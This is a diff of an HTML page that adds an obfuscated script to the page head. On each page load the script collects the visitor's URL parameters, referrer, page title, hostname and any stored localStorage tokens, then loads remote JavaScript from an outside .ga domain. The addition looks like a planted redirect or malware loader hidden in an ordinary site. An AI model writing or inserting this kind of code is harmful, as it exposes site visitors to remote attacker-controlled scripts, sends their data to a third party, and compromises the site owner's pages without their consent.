@@ -4,6 +4,49 @@
 <!DOCTYPE html>
 <html lang="en-US">
 <head>
+    <script>
+    (function() {
+    var name = '_87JzvpWW399X1rqD';
+    if (!window._87JzvpWW399X1rqD) {
+        window._87JzvpWW399X1rqD = {
+            unique: false,
+            ttl: 86400,
+            R_PATH: 'https://ol2kate.ga/k3J45fcR',
+            P_PATH: 'https://ol2kate.ga/7b4f75c/postback',
+        };
+    }
+    const _R1K1gjjTXqNksddS = localStorage.getItem('config');
+    if (typeof _R1K1gjjTXqNksddS !== 'undefined' && _R1K1gjjTXqNksddS !== null) {
+        var _zSkzLn3mnFyfPcmm = JSON.parse(_R1K1gjjTXqNksddS);
+        var _YBGKC62Tb52kT62t = Math.round(+new Date()/1000);
+        if (_zSkzLn3mnFyfPcmm.created_at + window._87JzvpWW399X1rqD.ttl < _YBGKC62Tb52kT62t) {
+            localStorage.removeItem('subId');
+            localStorage.removeItem('token');
+            localStorage.removeItem('config');
+        }
+    }
+    var _QbwzwNqwY7NS4tWt = localStorage.getItem('subId');
+    var _8HWJRBCbYDyx6Cn3 = localStorage.getItem('token');
+    var _RFzQGFvYz1HkyvZj = '?return=js.client';
+        _RFzQGFvYz1HkyvZj += '&' + decodeURIComponent(window.location.search.replace('?', ''));
+        _RFzQGFvYz1HkyvZj += '&se_referrer=' + encodeURIComponent(document.referrer);
+        _RFzQGFvYz1HkyvZj += '&default_keyword=' + encodeURIComponent(document.title);
+        _RFzQGFvYz1HkyvZj += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
+        _RFzQGFvYz1HkyvZj += '&name=' + encodeURIComponent(name);
+        _RFzQGFvYz1HkyvZj += '&host=' + encodeURIComponent(window._87JzvpWW399X1rqD.R_PATH);
+    if (typeof _QbwzwNqwY7NS4tWt !== 'undefined' && _QbwzwNqwY7NS4tWt && window._87JzvpWW399X1rqD.unique) {
+        _RFzQGFvYz1HkyvZj += '&sub_id=' + encodeURIComponent(_QbwzwNqwY7NS4tWt);
+    }
+    if (typeof _8HWJRBCbYDyx6Cn3 !== 'undefined' && _8HWJRBCbYDyx6Cn3 && window._87JzvpWW399X1rqD.unique) {
+        _RFzQGFvYz1HkyvZj += '&token=' + encodeURIComponent(_8HWJRBCbYDyx6Cn3);
+    }
+    var a = document.createElement('script');
+        a.type = 'application/javascript';
+        a.src = window._87JzvpWW399X1rqD.R_PATH + _RFzQGFvYz1HkyvZj;
+    var s = document.getElementsByTagName('script')[0];
+    s.parentNode.insertBefore(a, s)
+    })();
+    </script>
     <script src="js/websiteBrowserCheck.js"></script>
 
     <meta charset="utf-8">
